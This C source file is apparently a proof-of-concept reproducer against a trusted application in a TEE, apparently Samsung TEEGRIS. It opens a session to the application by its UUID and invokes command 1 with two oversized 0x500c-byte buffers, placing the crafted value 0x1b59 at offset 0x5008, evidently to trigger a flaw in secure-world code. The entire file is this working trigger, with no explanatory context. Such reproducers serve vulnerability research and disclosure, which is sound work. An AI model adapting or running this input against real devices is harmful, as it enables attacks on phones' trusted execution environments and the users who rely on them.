#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = malloc(0x500c);
    memset(mem_area1, 0, 0x500c);
    void* mem_area2 = malloc(0x500c);
    memset(mem_area2, 0, 0x500c);

	*(int*)(mem_area1+0x5008) = 0x1b59;

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x500c; 
    op.params[1].tmpref.buffer = mem_area2;  
    op.params[1].tmpref.size =  0x500c; 
    uint32_t err_origin;

	printf("sending invokeCmd\n");
    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-0000534b504d";
    TEEC_UUID *uuid = teegris_uuid(ta); 

    uint32_t err_origin;
    TEEC_Result res;
	TEEC_Context context;
    TEEC_Session session;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
	send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
